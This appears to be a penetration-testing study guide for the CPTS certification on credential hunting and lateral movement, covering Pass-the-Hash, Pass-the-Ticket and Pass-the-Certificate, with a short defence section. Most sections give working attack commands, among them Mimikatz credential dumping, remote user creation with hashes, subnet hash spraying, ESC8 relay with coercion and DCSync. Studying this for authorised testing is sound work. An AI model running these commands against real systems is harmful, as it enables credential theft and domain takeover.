CPTS · Credential access & lateral movement

Credential access.

Once you have a foothold, the fastest way forward is usually a credential someone left lying around, and the fastest way across is to reuse one you already hold without ever cracking it. This map covers hunting credentials on Windows and Linux hosts, in cleartext network traffic and across SMB shares, then moving laterally with Pass-the-Hash, Pass-the-Ticket and Pass-the-Certificate. A short defensive section closes it out. Open any node for what it means and the commands behind it. Everything here is for systems you are authorised to test: hunting is quiet, but passing attacks authenticate as other users and are logged, so stay inside scope and keep every credential with the engagement notes.

Full command reference on the CPTS page

Credential access, step by area

  1. 01

    Hunt credentials: Windows

    Search the file system and installed applications for credentials users and admins left behind. Base the search on what the host is for: an IT admin's workstation hides different secrets to a kiosk.

    • Think like the user (key terms)

      Credential hunting is detailed searching across the file system and applications for stored secrets. Refine it with what you know about the host: ask what the owner does day to day and which of those tasks need a password. Useful key terms to grep and search for are password, passwd, pwd, creds, credential, key, passkey, login, user, username, configuration, dbpassword and dbcredential. Localise them to the target (a German firm is likelier to write Benutzer than user).

      • Windows Search (GUI)

        With a desktop, the Start-menu search bar indexes OS settings and the file system; typing a key term such as pass surfaces matching files and settings quickly. A cheap first pass before reaching for tooling.

    • findstr (pattern search)

      findstr searches many file types for a pattern. /S recurses, /I is case-insensitive, /M prints only the matching filenames. Point it at the common text and config extensions with a key term, and widen the terms and extensions as leads appear. findstr is line-based with no real regex, so when it is too blunt (or stripped), PowerShell does the same job better: Get-ChildItem -Recurse piped to Select-String greps file contents with a proper regex, and Get-ChildItem -Recurse -Include filters by interesting filename. Both are built in, so they work where you cannot drop a tool.

      findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml
dir /s /b *pass* *cred* *.kdbx 2>nul
powershell -c "Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -EA SilentlyContinue | Select-String -Pattern 'password|pwd|secret'"
powershell -c "Get-ChildItem C:\Users -Recurse -Include *pass*,*cred*,*.kdbx -EA SilentlyContinue | Select Fullname"
    • LaZagne (stored app creds)

      LaZagne extracts credentials that browsers and other applications store insecurely. It is modular, each module targets different software; start LaZagne.exe all runs every module, and -vv shows what it is doing. Browsers are the richest target: LaZagne supports 35 of them on Windows, and stored browser passwords, though encrypted, are decryptable. Keep a standalone LaZagne.exe on the attack host and copy it over (xfreerdp pastes straight into the session). If LaZagne is flagged or blocked, go per-application instead: the GhostPack tools SharpChrome and SharpDPAPI pull Chromium and DPAPI secrets; firefox_decrypt reads a copied Firefox profile offline; and Mimikatz reads them live (dpapi::chrome, sekurlsa::credman after privilege::debug). The modules are in the table below.

      start LaZagne.exe all
LaZagne.exe all -vv
SharpChrome.exe logins
python3 firefox_decrypt.py profile.default-release
    • Common stash locations

      Beyond app stores, credentials turn up in predictable places. On a domain: Group Policy Preferences and scripts in the SYSVOL share, the AD user or computer description fields, and web.config on dev and IT shares. On any host: Unattend.xml / sysprep.inf (base64 or plaintext admin passwords), KeePass .kdbx databases (crack the master), and files named pass.txt, passwords.docx or passwords.xlsx on user systems, shares and SharePoint. IT shares outrank the company photo share, be strategic.

      • Group Policy Preferences (cpassword)

        A GPP that sets a local account password stores it AES-encrypted in a Groups.xml (or Services/ScheduledTasks/DataSources .xml) on SYSVOL, with a key Microsoft published, so anyone who can read SYSVOL can decrypt it offline. Grep SYSVOL for cpassword, or let a tool find and decrypt it: Get-GPPPassword (PowerSploit), NetExec's gpp_password / gpp_autologin modules, or gpp-decrypt on the captured string. Patched since MS14-025 (new GPP passwords are blocked) but old policies linger.

        findstr /S /I cpassword \\DOMAIN\sysvol\DOMAIN\policies\*.xml
Get-GPPPassword
netexec smb 10.129.42.197 -u user -p pass -M gpp_password
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
      • Registry secrets & autologon

        The registry caches credentials too. Winlogon's DefaultPassword holds an autologon password in clear; PuTTY sessions, OpenSSH, RealVNC/TightVNC and many installed apps keep secrets under HKCU or HKLM. reg query reads a known key, a wide reg query /f password /s sweeps for the word, and LaZagne's windows module automates the lot.

        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query HKLM /f password /t REG_SZ /s

  2. 02

    Hunt credentials: Linux

    On Linux everything is a file, so most of the hunt is finding and filtering the right ones: configs, databases, notes, scripts, cron, history and logs, then memory and browser stores.

    • Files: configs, DBs, notes, scripts

      Configuration files are the core of services and often hold credentials; the usual extensions are .conf, .config and .cnf (though they can be renamed). Find them, then grep each for user/pass. Apply the same sweep to databases (.sql, .db) and scripts (.py, .sh, .pl), which frequently embed credentials so they can run unattended. Notes have no fixed extension, so search .txt and extension-less files in home directories. Two more sources deserve a dedicated pass: cron (system jobs in /etc/crontab and /etc/cron.d, user jobs via crontab -l) runs scripts that often embed a password, and SSH private keys, which have no fixed extension and are found by their header line.

      for l in .conf .config .cnf; do echo "[$l]"; find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
for i in $(find / -name '*.cnf' 2>/dev/null | grep -v "doc\|lib"); do echo "$i"; grep -i "user\|pass" "$i" 2>/dev/null | grep -v "#"; done
find / -name "*.sql" -o -name "*.db" 2>/dev/null | grep -v "doc\|lib\|share"
find /home/* -type f -name "*.txt" -o ! -name "*.*"
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*/ 2>/dev/null; crontab -l
grep -rlE 'BEGIN (OPENSSH|RSA|EC|DSA) PRIVATE KEY' /home /root /etc 2>/dev/null
    • History & logs

      Shell history captures typed credentials: tail the .bash_history, .bashrc and .bash_profile of each user (a su followed by a script argument is a gift). System logs in /var/log record authentication and command activity; grep them for session, accepted, failed, sudo and COMMAND= lines. The important log files are in the table below.

      tail -n 20 /home/*/.bash*
grep -riE 'password|pass=|secret' /home 2>/dev/null
for i in $(ls /var/log/* 2>/dev/null); do grep -l "accepted\|session opened\|sudo\|COMMAND=" "$i" 2>/dev/null; done
    • Memory & cache

      Applications keep credentials in memory to reuse them. mimipenguin dumps cleartext passwords for logged-in users from memory and files (needs root). LaZagne works on Linux too, pulling from the shadow file, keyrings (libsecret, KWallet), browsers, SSH, GPG, Docker, KeePass, AWS, FileZilla and more, far more sources than on Windows. Keyrings are the OS password manager: encrypted stores unlocked by a master password. With a live desktop session the keyring is already unlocked, so secret-tool reads entries straight out of it; the encrypted keyring files themselves live under the user profile.

      sudo python3 mimipenguin.py
sudo python3 laZagne.py all
secret-tool search --all service '' 2>/dev/null
ls -la ~/.local/share/keyrings/ ~/.gnupg/ 2>/dev/null
    • Browser credentials (Firefox)

      Firefox stores saved logins encrypted in logins.json inside the profile directory (.mozilla/firefox/<profile>.default-release). Encrypted is not safe: firefox_decrypt (Python 3.9+) reads the profile and prints the plaintext website, username and password; LaZagne's browsers module does the same. Copy the profile off the host and decrypt it on the attack box.

      ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/*.default-release/logins.json | jq .
python3.9 firefox_decrypt.py

  3. 03

    Hunt credentials: traffic & shares

    Credentials in motion and credentials at rest on shares. Sniff cleartext protocols for logins, and spider SMB shares for secrets left in files.

    • Cleartext protocols (Wireshark)

      Legacy systems, misconfigurations and test services still use unencrypted protocols (HTTP, FTP, SNMP, POP3, IMAP, SMTP, LDAP, Telnet) that carry credentials in the clear. Wireshark's filter engine searches live or captured traffic: filter to a protocol, follow a TCP stream, or use a content filter like http contains "passw" (or Edit > Find Packet) to jump to a login. An HTTP POST (http.request.method == "POST") over cleartext often holds the username and password in the form data. The common filters and the plaintext/encrypted protocol pairs are in the tables below.

      • Pcredz (automated extraction)

        Pcredz scans a live interface or a pcap and pulls credentials automatically: HTTP Basic/NTLM and form logins, FTP, POP/SMTP/IMAP, SNMP community strings, credit-card numbers, NTLMv1/v2 hashes from SMB/LDAP/MSSQL/HTTP/DCE-RPC, and Kerberos AS-REQ pre-auth hashes. Run it against a capture with -f; -t parses TCPDump format and -v is verbose.

        ./Pcredz -f capture.pcapng -t -v
    • Spider shares from Windows

      Snaffler, run on a domain-joined host, finds readable shares across the domain and flags interesting files by name, extension and content, colour-coding hits (red is high interest). It is noisy with output and false positives; -u searches for references to AD users, -i and -n scope which shares are included. PowerHuntShares does not need a domain-joined host and writes an HTML report of shares, permissions and high-risk access.

      Snaffler.exe -s
Snaffler.exe -s -o snaffler.log
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
    • Spider shares from Linux

      From a non-domain host, MANSPIDER (best run from its Docker container) scans SMB shares for a string in file content (-c) with supplied credentials. NetExec spiders shares with --spider on a protocol: point it at a share, add --content and a --pattern to grep file contents. SnafflePy is a Python port of Snaffler for when you are off a domain-joined box. All of them pull matching files back for review, so start with a keyword like passw and narrow from there. For a quick manual pass, mount the share and grep it, or Get-ChildItem -Recurse -Include *.ext | Select-String from Windows.

      docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c passw -u mendres -p 'Password!'
nxc smb 10.129.234.121 -u mendres -p 'Password!' --spider IT --content --pattern passw
python3 snafflepy.py -u mendres -p 'Password!' -d domain.local 10.129.234.121
nxc smb 10.129.234.121 -u mendres -p 'Password!' --shares

  4. 04

    Pass the Hash (PtH)

    Authenticate with an NTLM hash instead of the plaintext password. Because NTLM hashes are unsalted and static until the password changes, a dumped hash is a login, no cracking needed.

    • NTLM & the PtH idea

      NTLM is a challenge-response SSO protocol still kept for legacy compatibility, though Kerberos is the default in AD. Passwords on the server and DC are not salted, so an attacker holding the NTLM hash can authenticate a session without ever knowing or cracking the password: Pass the Hash. You need admin or specific rights on the source to get a hash, from the local SAM, the DC's NTDS.dit, or LSASS memory. The tools, by platform, are in the table below.

    • Mimikatz sekurlsa::pth (Windows)

      Mimikatz's sekurlsa::pth starts a process under a user's context using their NTLM hash. Supply /user, /rc4 or /NTLM (the hash), /domain (for a local account use the computer name, localhost or a dot) and /run (the program; defaults to cmd.exe). The new cmd.exe then authenticates to network resources as that user.

      mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
    • Invoke-TheHash (Windows)

      Invoke-TheHash is a set of PowerShell functions for PtH over SMB or WMI via the .NET TCPClient, authenticating the NTLM hash into NTLMv2. No local admin is needed client-side, but the user and hash must have admin rights on the target. Invoke-SMBExec and Invoke-WMIExec take -Target, -Username, -Hash, -Domain and -Command; the target can be a hostname or IP.

      Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add" -Verbose
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64>"
    • Impacket (Linux)

      Impacket's execution tools take -hashes LMHASH:NTHASH (leave the LM half empty with a leading colon) for PtH. psexec drops a service for a SYSTEM shell; wmiexec, atexec and smbexec give quieter semi-interactive execution over WMI, the task scheduler and SMB respectively.

      impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
    • NetExec & spraying (Linux)

      NetExec authenticates a hash across a host or a whole subnet with -H, so you can test local-admin password reuse at scale (gold images often share one local admin password). (Pwn3d!) means local admin; -x runs a command. Use -d . with --local-auth for local accounts, and mind the account lockout policy when spraying domain accounts.

      netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
netexec smb 172.16.1.0/24 -u Administrator --local-auth -H 30B3783CE2ABF1AF70F77D0660CF3453
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
    • Evil-WinRM & RDP (Linux)

      If SMB is blocked or you lack admin, Evil-WinRM passes the hash over WinRM with -H (prefix the user with the domain for a domain account). xfreerdp passes it over RDP with /pth, but the target needs Restricted Admin Mode enabled (set DisableRestrictedAdmin to 0 under HKLM\System\CurrentControlSet\Control\Lsa), or the connection is refused.

      evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
    • UAC limits PtH for local accounts

      UAC remote restriction caps PtH with local accounts. When LocalAccountTokenFilterPolicy (under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System) is 0, only the built-in RID-500 Administrator can do remote admin; setting it to 1 enables the other local admins. The exception: if FilterAdministratorToken is enabled, even the RID-500 account is under UAC protection and remote PtH fails against it. These limits apply only to local accounts, a domain account with admin rights on the box still passes freely.

  5. 05

    Pass the Ticket (PtT)

    Move laterally with a stolen Kerberos ticket instead of a hash. Harvest tickets from LSASS (Windows) or ccache/keytab files (Linux), then inject them into a session.

    • TGT, TGS & the PtT idea

      Kerberos is ticket-based: the Ticket Granting Ticket (TGT), obtained by encrypting a timestamp with your password hash, is exchanged at the KDC for per-service Ticket Granting Service (TGS) tickets. Steal either and you can authenticate as that user, a TGT lets you request service tickets for anything they can reach; a TGS grants one specific resource. On Windows, tickets live in LSASS; on Linux, in ccache or keytab files.

    • Harvest tickets (Windows)

      As local admin you can collect every session's tickets; as a normal user, only your own. Mimikatz sekurlsa::tickets /export writes each ticket to a .kirbi file (tickets ending in $ are computer accounts; a krbtgt ticket is a TGT). Rubeus dump prints tickets as Base64 (/nowrap for easy copy). Run either elevated to get all tickets.

      mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
Rubeus.exe dump /nowrap
dir *.kirbi
    • OverPass-the-Hash / Pass-the-Key

      Pass-the-Key (OverPass-the-Hash) turns a user's key (rc4/aes128/aes256) into a full TGT. Dump the keys with Mimikatz sekurlsa::ekeys, then either sekurlsa::pth with the hash, or Rubeus asktgt with /rc4, /aes128 or /aes256. Prefer the AES key: in modern domains (2008+) AES is default, and feeding an rc4 (NTLM) key into a Kerberos exchange can flag as an encryption downgrade. Rubeus needs no admin for asktgt; Mimikatz does.

      mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc...fda3fe60 /nowrap
mimikatz.exe "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
    • Import a ticket (Windows)

      Inject a ticket into the current logon session, then use any Kerberos service as that user. Rubeus asktgt /ptt requests and imports in one step; Rubeus ptt /ticket:<file-or-base64> imports an existing ticket; Mimikatz kerberos::ptt <file.kirbi> does the same. For a non-admin target where you are in Remote Management Users, pair a ticket with Enter-PSSession (PowerShell Remoting); Rubeus createnetonly makes a sacrificial logon session so you do not clobber your own TGTs.

      Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd...13f11dc /ptt
Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
Enter-PSSession -ComputerName DC01
    • Tickets on Linux (ccache & keytab)

      A domain-joined Linux host (check with realm list, or ps -ef for sssd/winbind) stores Kerberos tickets as ccache files in /tmp (path in KRB5CCNAME) and as keytab files (principal-to-key pairs for unattended auth, often .keytab, /etc/krb5.keytab for the machine account). ccache files need only read access; keytabs need read/write. Find them, impersonate with the right tool, then reuse against the domain. The storage types are in the table below.

      • Find & use tickets

        Find keytabs by name and ccache files in /tmp. klist -k -t reads a keytab's principal; kinit -k -t imports it as that user; set KRB5CCNAME to a readable ccache to assume it. With root you can read any user's ccache, including a Domain Admin's.

        find / -name '*keytab*' -ls 2>/dev/null
ls -la /tmp/krb5cc_*
klist -k -t /opt/carlos.keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/carlos.keytab
export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
      • KeyTabExtract (hashes from keytab)

        KeyTabExtract pulls the realm, principal and hashes (NTLM, AES-256, AES-128) out of a keytab. The NTLM hash feeds a Pass-the-Hash; the AES keys forge tickets with Rubeus or crack to plaintext. A keytab can hold several users' credentials.

        python3 keytabextract.py /opt/carlos.keytab
      • ticketConverter & Linikatz

        impacket-ticketConverter swaps a Linux ccache for a Windows .kirbi and back, so a ticket harvested on one platform works on the other. Linikatz is Mimikatz for UNIX: run as root, it extracts credentials and tickets from FreeIPA, SSSD, Samba and more into ccache/keytab files for reuse.

        impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
./linikatz.sh

  6. 06

    Pass the Certificate

    Use an X.509 certificate to obtain a TGT via PKINIT. The route into credential-less territory when you can get a certificate for a target, often through AD CS abuse or Shadow Credentials.

    • PKINIT & the idea

      PKINIT (Public Key Cryptography for Initial Authentication) extends Kerberos to use public-key cryptography in the initial exchange, normally for smart-card logon. Pass-the-Certificate uses an X.509 certificate and its private key to obtain a TGT for the certificate's subject, then it is ordinary Pass-the-Ticket. It pairs with AD CS attacks and Shadow Credentials. Full AD CS coverage is a module of its own; this is the lateral-movement slice.

    • AD CS NTLM relay (ESC8)

      ESC8 relays NTLM authentication to an AD CS web-enrolment endpoint (HTTP /certsrv by default) to mint a certificate for the victim. Run ntlmrelayx with --adcs and a --template (KerberosAuthentication is the DC auth template; enumerate with Certipy), then coerce a machine to authenticate, e.g. the printer bug (printerbug.py) forces a DC to connect back. The relay issues a PKCS#12 certificate for the machine account.

      impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'pass'@10.129.234.109 10.10.16.12
    • Certificate to TGT to DCSync

      With the .pfx, gettgtpkinit.py (PKINITtools) requests a TGT via PKINIT and saves a ccache. Export KRB5CCNAME and you are back in Pass-the-Ticket territory: as a DC machine account, run secretsdump -k -no-pass for a DCSync to pull any account's NT hash (e.g. the domain Administrator). If PKINIT is unsupported for the target, PassTheCert authenticates to LDAPS with the certificate instead.

      python3 gettgtpkinit.py -cert-pfx DC01.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
    • Shadow Credentials (pywhisker)

      If you can write a victim's msDS-KeyCredentialLink attribute (the AddKeyCredentialLink edge in BloodHound), you can add your own key-credential and authenticate as them via PKINIT. pywhisker generates an X.509 certificate and writes the public key to the attribute, returning a .pfx and its password; feed that to gettgtpkinit.py for a TGT, then pass the ticket (e.g. Evil-WinRM with Kerberos if the victim is in Remote Management Users).

      pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'pass' --target jpinkman --action add
python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass '<pfx-pass>' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

  7. 07

    Defence (reference)

    The other side of the coin: how organisations should set password policy and protect credentials. Reference-only, to inform remediation advice in the report.

    • Password policy

      A password policy sets rules across the whole credential lifecycle, not just minimum length. Standards to cite: NIST SP 800-63B, the CIS Password Policy Guide and PCI DSS. A typical baseline wants 8+ characters with mixed case, a digit and a symbol, not the username. Two caveats worth raising: enforced expiry (the old 90-day rule) tends to produce predictable increments (Inlanefreight01! becomes Inlanefreight02!), so NIST now advises against routine expiry; and a policy should blacklist the company name, common words, months, seasons and variants of password and welcome. Enforce it technically (an AD password-policy GPO) and communicate it.

    • Password managers

      People hold roughly a hundred passwords, which drives reuse and weak choices; a password manager stores strong, unique credentials in an encrypted database behind one master password. Cloud managers (1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass) sync across devices and typically use zero-knowledge encryption: keys are derived from the master password so the provider cannot read the vault. Local managers (KeePass, KWallet, Password Safe) keep the database on the host, trading sync for the user owning its storage. Both use key-derivation functions with random salt against precomputation.

    • Going passwordless

      A password is a knowledge factor, exposed to theft, reuse and sharing. Stronger assurance comes from a possession or inherent factor: MFA, one-time and time-based codes (OTP/TOTP), and FIDO2 passwordless logins with a hardware key such as a YubiKey. Vendors (Microsoft, Okta, Auth0, Ping) push passwordless to remove the knowledge factor entirely; device-compliance and IP restrictions add further gates. Evaluate the implementation before trusting any alternative.
